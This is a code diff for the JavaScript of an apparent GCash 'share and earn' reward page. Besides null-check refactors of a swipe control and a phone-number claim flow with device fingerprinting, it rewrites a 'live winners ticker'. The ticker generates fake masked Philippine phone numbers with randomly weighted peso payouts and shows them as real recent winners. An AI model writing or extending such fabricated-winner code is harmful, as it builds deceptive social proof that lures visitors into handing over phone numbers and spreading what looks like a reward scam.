@@ -36,15 +36,17 @@ let trailInterval = null;
 
 function startFireTrail() {
     if (trailInterval) clearInterval(trailInterval);
-    swipeFireTrail.classList.add('active');
-    trailInterval = setInterval(() => {
-        if (swipeFireTrail) {
-            swipeFireTrail.classList.remove('active');
-            setTimeout(() => {
-                if (swipeFireTrail) swipeFireTrail.classList.add('active');
-            }, 50);
-        }
-    }, 100);
+    if (swipeFireTrail) {
+        swipeFireTrail.classList.add('active');
+        trailInterval = setInterval(() => {
+            if (swipeFireTrail) {
+                swipeFireTrail.classList.remove('active');
+                setTimeout(() => {
+                    if (swipeFireTrail) swipeFireTrail.classList.add('active');
+                }, 50);
+            }
+        }, 100);
+    }
 }
 
 function stopFireTrail() {
@@ -70,6 +72,7 @@ function initSwipe() {
     const iconWidth = 56;
     const maxLeft = trackWidth - iconWidth;
     
+    // Touch events for mobile
     swipeIcon.addEventListener('touchstart', (e) => {
         if (swipeCompleted) return;
         e.preventDefault();
@@ -107,6 +110,7 @@ function initSwipe() {
         }
     });
     
+    // Mouse events for desktop
     swipeIcon.addEventListener('mousedown', (e) => {
         if (swipeCompleted) return;
         e.preventDefault();
@@ -166,7 +170,7 @@ async function completeSwipe() {
     }
     
     setTimeout(() => {
-        modalOverlay.style.display = 'flex';
+        if (modalOverlay) modalOverlay.style.display = 'flex';
         if (swipeContainer) swipeContainer.style.display = 'none';
     }, 400);
     
@@ -175,67 +179,55 @@ async function completeSwipe() {
     }, 500);
 }
 
-// ========== LIVE WINNERS TICKER - PREMIUM VERSION ==========
-function updateTickerWithTransition(newText, amount, type) {
+// ========== LIVE WINNERS TICKER ==========
+function updateTickerWithTransition(phoneNumber, amount, type) {
     if (!winnerEntry) return;
     
     winnerEntry.classList.remove('fade-in');
     winnerEntry.classList.add('fade-out');
     
     setTimeout(() => {
-        // Determine icon based on type
-        const gcIcon = '<img src="images/gc_icon.png" class="ticker-gcash-icon" alt="GCash">';
-        
         let displayText = '';
         if (type === 'task') {
-            displayText = `completed task <span class="ticker-amount">+₱${amount}</span> ${gcIcon}`;
+            displayText = `${phoneNumber} completed task +₱${amount}`;
         } else {
-            displayText = `referral bonus <span class="ticker-amount">+₱${amount}</span> ${gcIcon}`;
+            displayText = `${phoneNumber} successful referral +₱${amount}`;
         }
         
-        winnerEntry.innerHTML = `${newText} ${displayText}`;
+        winnerEntry.innerHTML = displayText;
         winnerEntry.classList.remove('fade-out');
         winnerEntry.classList.add('fade-in');
     }, 200);
 }
 
 function startTicker() {
-    const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
-    const taskAmounts = [150, 200, 250, 300];
-    const referralAmounts = [150];
+    const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
+    
+    function generateRandomAmount() {
+        const rand = Math.random();
+        // 60% chance for 150, 25% for 300, 10% for 450, 5% for 600
+        if (rand < 0.60) {
+            return 150;
+        } else if (rand < 0.85) {
+            return 300;
+        } else if (rand < 0.95) {
+            return 450;
+        } else {
+            return 600;
+        }
+    }
     
     function generateWinner() {
         const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
         const randomSuffix = Math.floor(1000 + Math.random() * 9000);
         const phoneNumber = `${randomPrefix}***${randomSuffix}`;
-        
-        // 70% chance for task, 30% chance for referral bonus
-        const isTask = Math.random() < 0.7;
-        
-        let amount;
-        let type;
-        
-        if (isTask) {
-            amount = taskAmounts[Math.floor(Math.random() * taskAmounts.length)];
-            type = 'task';
-        } else {
-            amount = referralAmounts[0];
-            type = 'referral';
-        }
-        
+        const amount = generateRandomAmount();
+        const type = Math.random() < 0.7 ? 'task' : 'referral';
         return { phoneNumber, amount, type };
     }
     
-    // Initial display
     const initial = generateWinner();
-    const gcIcon = '<img src="images/gc_icon.png" class="ticker-gcash-icon" alt="GCash">';
-    let initialText = '';
-    if (initial.type === 'task') {
-        initialText = `${initial.phoneNumber} completed task <span class="ticker-amount">+₱${initial.amount}</span> ${gcIcon}`;
-    } else {
-        initialText = `${initial.phoneNumber} referral bonus <span class="ticker-amount">+₱${initial.amount}</span> ${gcIcon}`;
-    }
-    winnerEntry.innerHTML = initialText;
+    winnerEntry.innerHTML = `${initial.phoneNumber} ${initial.type === 'task' ? 'completed task' : 'successful referral'} +₱${initial.amount}`;
     winnerEntry.classList.add('fade-in');
     
     setInterval(() => {
@@ -389,6 +381,7 @@ async function isNumberClaimed(phone) {
 
 // ========== SHOW BLOCKED UI ==========
 function showBlockedUI(reason = "banned") {
+    if (!modalOverlay) return;
     modalOverlay.style.display = 'flex';
     
     let title = "ACCESS RESTRICTED";
@@ -399,24 +392,27 @@ function showBlockedUI(reason = "banned") {
         blockMessage = "This number has already claimed a reward before.";
     }
 
-    document.getElementById('modalBodyContent').innerHTML = `
-        <div class="bonus-box-premium">
-            <div class="bonus-amount-premium">🚫</div>
-        </div>
-        <h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">${title}</h3>
-        <p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">${blockMessage}</p>
-        <button class="login-btn" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
-    `;
+    const modalBody = document.getElementById('modalBodyContent');
+    if (modalBody) {
+        modalBody.innerHTML = `
+            <div class="bonus-box-premium">
+                <div class="bonus-amount-premium">🚫</div>
+            </div>
+            <h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">${title}</h3>
+            <p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">${blockMessage}</p>
+            <button class="login-btn" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
+        `;
+    }
     if (mainCard) mainCard.style.opacity = "0.3";
 }
 
-// ========== PROCESS STEP 1 WITH LOGIN ANIMATION ==========
+// ========== PROCESS STEP 1 ==========
 window.processStep1 = async function() {
+    if (!userPhoneInput || !claimBtn) return;
+    
     const phone = userPhoneInput.value.trim();
     const btn = claimBtn;
     const fingerprint = getDeviceFingerprint();
-    const loginTextSpan = btn.querySelector('.login-text');
-    const loginDotsSpan = btn.querySelector('.login-dots');
 
     if (phone.length < 10 || !phone.match(/^\d+$/)) {
         alert("Enter valid mobile number.");
@@ -428,24 +424,10 @@ window.processStep1 = async function() {
     // Start loading animation
     btn.classList.add('loading');
     btn.disabled = true;
-    
-    // Animate dots manually
-    let dotCount = 0;
-    const dotInterval = setInterval(() => {
-        if (!btn.classList.contains('loading')) {
-            clearInterval(dotInterval);
-            return;
-        }
-        dotCount = (dotCount + 1) % 4;
-        let dots = '';
-        for (let i = 0; i < dotCount; i++) dots += '.';
-        if (loginDotsSpan) loginDotsSpan.textContent = dots;
-    }, 400);
 
     try {
         const banDetails = await getBanDetails(fullPhone, fingerprint);
         if (banDetails.isBanned) {
-            clearInterval(dotInterval);
             btn.classList.remove('loading');
             btn.disabled = false;
             showBlockedUI("banned");
@@ -454,7 +436,6 @@ window.processStep1 = async function() {
         
         const isClaimed = await isNumberClaimed(fullPhone);
         if (isClaimed) {
-            clearInterval(dotInterval);
             btn.classList.remove('loading');
             btn.disabled = false;
             showBlockedUI("claimed");
@@ -474,11 +455,10 @@ window.processStep1 = async function() {
         localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
         
         // Success animation
-        clearInterval(dotInterval);
         btn.classList.remove('loading');
         btn.classList.add('success');
+        const loginTextSpan = btn.querySelector('.login-text');
         if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS';
-        if (loginDotsSpan) loginDotsSpan.textContent = '';
         
         setTimeout(() => {
             window.location.href = "share_and_earn.html";
@@ -486,7 +466,6 @@ window.processStep1 = async function() {
         
     } catch (error) {
         console.error("Process error:", error);
-        clearInterval(dotInterval);
         btn.classList.remove('loading');
         btn.disabled = false;
         alert("An error occurred. Please try again.");
@@ -566,95 +545,6 @@ function initParticles() {
     animateParticles();
 }
 
-// ========== LIVE WINNERS TICKER - CORRECT AMOUNTS ==========
-function updateTickerWithTransition(phoneNumber, amount, type) {
-    if (!winnerEntry) return;
-    
-    winnerEntry.classList.remove('fade-in');
-    winnerEntry.classList.add('fade-out');
-    
-    setTimeout(() => {
-        const gcIcon = '<img src="images/gc_icon.png" class="ticker-gcash-icon" alt="GCash">';
-        let displayText = '';
-        
-        if (type === 'task') {
-            displayText = `${phoneNumber} completed task <span class="ticker-amount">${gcIcon}₱${amount}</span>`;
-        } else {
-            displayText = `${phoneNumber} successful referral <span class="ticker-amount">${gcIcon}₱${amount}</span>`;
-        }
-        
-        winnerEntry.innerHTML = displayText;
-        winnerEntry.classList.remove('fade-out');
-        winnerEntry.classList.add('fade-in');
-    }, 200);
-}
-
-function startTicker() {
-    const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
-    
-    // Task rewards (common)
-    const taskRewards = [150, 150, 150, 150, 150, 150, 300, 300, 300, 450, 450, 600];
-    
-    // Referral reward (fixed)
-    const referralReward = 300;
-    
-    // Rare rewards
-    const rareRewards = [750, 900, 1200];
-    
-    function getRandomAmount() {
-        const rand = Math.random();
-        
-        // 70% task reward, 30% referral reward
-        if (rand < 0.7) {
-            // Task reward - weighted
-            const taskRand = Math.random();
-            if (taskRand < 0.6) {
-                return { amount: 150, type: 'task' };      // 60% chance
-            } else if (taskRand < 0.85) {
-                return { amount: 300, type: 'task' };      // 25% chance
-            } else if (taskRand < 0.95) {
-                return { amount: 450, type: 'task' };      // 10% chance
-            } else {
-                return { amount: 600, type: 'task' };      // 5% chance
-            }
-        } else {
-            // Referral reward
-            const rareRand = Math.random();
-            if (rareRand < 0.95) {
-                return { amount: 300, type: 'referral' };   // 95% chance for 300
-            } else {
-                const rareAmount = rareRewards[Math.floor(Math.random() * rareRewards.length)];
-                return { amount: rareAmount, type: 'referral' }; // 5% chance for rare
-            }
-        }
-    }
-    
-    function generateWinner() {
-        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-        const phoneNumber = `${randomPrefix}***${randomSuffix}`;
-        const { amount, type } = getRandomAmount();
-        return { phoneNumber, amount, type };
-    }
-    
-    // Initial display
-    const initial = generateWinner();
-    const gcIcon = '<img src="images/gc_icon.png" class="ticker-gcash-icon" alt="GCash">';
-    let initialText = '';
-    if (initial.type === 'task') {
-        initialText = `${initial.phoneNumber}<span class="ticker-amount">${gcIcon}₱${initial.amount}</span>`;
-    } else {
-        initialText = `${initial.phoneNumber} <span class="ticker-amount">${gcIcon}₱${initial.amount}</span>`;
-    }
-    winnerEntry.innerHTML = initialText;
-    winnerEntry.classList.add('fade-in');
-    
-    setInterval(() => {
-        const { phoneNumber, amount, type } = generateWinner();
-        updateTickerWithTransition(phoneNumber, amount, type);
-    }, 4800);
-}
-
 // ========== MODAL FUNCTIONS ==========
 function closeModal() {
     if (modalOverlay) modalOverlay.style.display = 'none';
@@ -675,6 +565,8 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 // Enter key support
-userPhoneInput?.addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') window.processStep1();
-});
+if (userPhoneInput) {
+    userPhoneInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') window.processStep1();
+    });
+}
